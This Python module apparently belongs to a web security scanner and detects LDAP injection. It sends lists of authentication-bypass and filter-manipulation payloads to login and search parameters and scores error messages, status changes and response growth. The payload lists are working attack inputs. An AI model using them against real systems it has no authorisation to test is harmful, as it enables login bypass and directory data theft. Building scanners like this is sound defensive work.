"""
modules/ldap_injection.py - LDAP Injection Detector
Detects LDAP injection via filter manipulation in auth and search endpoints.
"""

import re
import logging
import urllib.parse
from typing import Dict, List, Any, Optional
from core.http_engine import HTTPClient
from core.state_manager import StateManager

logger = logging.getLogger("recon.ldap_injection")


class LDAPInjectionDetector:
    """
    Detects LDAP injection vulnerabilities.

    Attack vectors:
    1. Authentication bypass: *)(&   admin)(*)(|
    2. Search filter manipulation: *)(uid=*))(|(uid=*
    3. Blind LDAP injection: response time or behavioral difference
    4. Error-based LDAP injection: malformed DN/filter revealing structure
    """

    LDAP_AUTH_BYPASS = [
        "*",
        "*)(",
        "*)(|",
        "*))(|(uid=*",
        "admin)(&)",
        "admin)(|(password=*)",
        "*()|%26'",
        "*|",
        "admin*",
        "*(|(mail=*))",
        "*(|(objectclass=*))",
        "*)(&(objectclass=void",
        "admin)(!(&(1=0)))",
        "%2a%29%28%7c",
    ]

    LDAP_SEARCH_PAYLOADS = [
        "*",
        "*)(",
        "*(|(objectClass=*))",
        "*))(|(objectClass=*",
        "\\2a\\29\\28\\7c",
        ")(|(uid=admin))(|(uid=",
    ]

    LDAP_PARAM_NAMES = {
        "username", "user", "login", "email", "uid", "cn",
        "dn", "samaccountname", "userprincipalname",
        "search", "query", "q", "name", "filter",
        "memberof", "ou", "dc", "attribute",
    }

    LDAP_ERROR_PATTERNS = [
        r"LDAPException",
        r"javax\.naming",
        r"com\.sun\.jndi",
        r"LDAP.*error",
        r"Invalid LDAP",
        r"Distinguished Name",
        r"ldap_search",
        r"ldap_bind",
        r"NamingException",
        r"InvalidDNSyntax",
        r"Object.*does not exist",
        r"No Such Object",
        r"ldap://",
        r"LDAP_",
    ]

    def __init__(self, state: StateManager = None, http_client: HTTPClient = None):
        self.state = state
        self.http_client = http_client or HTTPClient()

    def detect(self, endpoints: List[Any], progress_cb=None) -> Dict[str, Any]:
        """Scan endpoints for LDAP injection."""
        logger.info(f"[LDAP] Starting LDAP injection detection on {len(endpoints)} endpoints")

        results = {
            "vulnerabilities": [],
            "endpoints_tested": 0,
            "ldap_confirmed": 0,
        }

        for i, endpoint in enumerate(endpoints):
            if progress_cb:
                progress_cb(i, len(endpoints))

            if isinstance(endpoint, dict):
                url = endpoint.get("url") or endpoint.get("endpoint")
                raw_params = endpoint.get("parameters") or endpoint.get("query_params") or []
                if isinstance(raw_params, dict):
                    params = list(raw_params.keys())
                else:
                    params = list(raw_params)
                method = (endpoint.get("method") or "GET").upper()
            else:
                url = str(endpoint)
                params = []
                method = "GET"

            if not url:
                continue

            # Only test auth/search-related endpoints
            if not self._is_ldap_candidate(url):
                results["endpoints_tested"] += 1
                continue

            parsed = urllib.parse.urlparse(url)
            url_params = list(urllib.parse.parse_qs(parsed.query).keys())
            all_params = list(set(params + url_params))

            ldap_params = [p for p in all_params if p.lower() in self.LDAP_PARAM_NAMES] or all_params[:3]

            for param in ldap_params:
                vuln = self._test_ldap(url, param, method)
                if vuln.get("vulnerable"):
                    results["vulnerabilities"].append(vuln)
                    results["ldap_confirmed"] += 1
                    break

            results["endpoints_tested"] += 1

        logger.info(f"[LDAP] Found {results['ldap_confirmed']} LDAP injection vulnerabilities")
        return results

    def _is_ldap_candidate(self, url: str) -> bool:
        """Check if endpoint might use LDAP."""
        ldap_keywords = [
            "login", "auth", "signin", "ldap", "directory",
            "search", "user", "account", "employee", "member",
            "admin", "portal", "sso", "saml",
        ]
        url_lower = url.lower()
        return any(kw in url_lower for kw in ldap_keywords)

    def _test_ldap(self, url: str, param: str, method: str) -> Dict[str, Any]:
        """Test parameter for LDAP injection."""
        result = {
            "url": url,
            "parameter": param,
            "method": method,
            "vulnerable": False,
            "confidence": 0.0,
            "evidence": [],
        }

        # Get baseline
        try:
            baseline = self.http_client.get(url, timeout=10)
            baseline_text = baseline.text
            baseline_status = baseline.status_code
        except Exception:
            baseline_text = ""
            baseline_status = 0

        payloads = self.LDAP_AUTH_BYPASS if "auth" in url.lower() or "login" in url.lower() \
            else self.LDAP_SEARCH_PAYLOADS

        for payload in payloads:
            try:
                if method == "POST":
                    resp = self.http_client.post(
                        url,
                        data={param: payload},
                        timeout=10,
                    )
                else:
                    test_url = self._inject_param(url, param, payload)
                    resp = self.http_client.get(test_url, timeout=10)

                check = self._check_ldap_indicators(resp, baseline_status, baseline_text)
                if check["score"] > 0.4:
                    result["vulnerable"] = True
                    result["confidence"] = max(result["confidence"], check["score"])
                    result["evidence"].append({
                        "payload": payload,
                        "indicator": check["reason"],
                        "status": resp.status_code,
                    })
                    if result["confidence"] >= 0.8:
                        return result

            except Exception as e:
                logger.debug(f"[LDAP] Error testing {param} on {url}: {e}")
                continue

        return result

    def _inject_param(self, url: str, param: str, value: str) -> str:
        """Inject value into URL parameter."""
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)
        params[param] = [value]
        new_query = urllib.parse.urlencode(params, doseq=True)
        return urllib.parse.urlunparse(parsed._replace(query=new_query))

    def _check_ldap_indicators(
        self, response, baseline_status: int, baseline_text: str
    ) -> Dict[str, Any]:
        """Check response for LDAP injection indicators."""
        score = 0.0
        reason = ""
        text = response.text if hasattr(response, "text") else ""

        # Error-based detection
        for pattern in self.LDAP_ERROR_PATTERNS:
            if re.search(pattern, text, re.IGNORECASE):
                score = 0.8
                reason = f"LDAP error message: matched '{pattern}'"
                return {"score": score, "reason": reason}

        # Auth bypass: was denied, now accepted
        if baseline_status in [401, 403] and response.status_code == 200:
            score = 0.9
            reason = "Authentication bypass via LDAP injection"
            return {"score": score, "reason": reason}

        # Behavioral change: new success keyword appears — weak signal on its own,
        # requires combination with other indicators to exceed the 0.4 threshold.
        if response.status_code == 200 and baseline_status == 200:
            success_keywords = ["welcome", "dashboard", "logout", "profile", "account", "success"]
            for kw in success_keywords:
                if kw in text.lower() and kw not in baseline_text.lower():
                    score = max(score, 0.3)
                    reason = f"New success keyword '{kw}' in response"
                    break

        # Response size change (data returned)
        if len(text) > len(baseline_text) * 2:
            score = max(score, 0.4)
            reason = reason or "Response size doubled — possible data extraction"

        return {"score": min(score, 1.0), "reason": reason}


def detect_ldap(
    state: StateManager, endpoints: List[Any], progress_cb=None
) -> Dict[str, Any]:
    """Standalone function for LDAP injection detection."""
    detector = LDAPInjectionDetector(state=state)
    return detector.detect(endpoints, progress_cb)
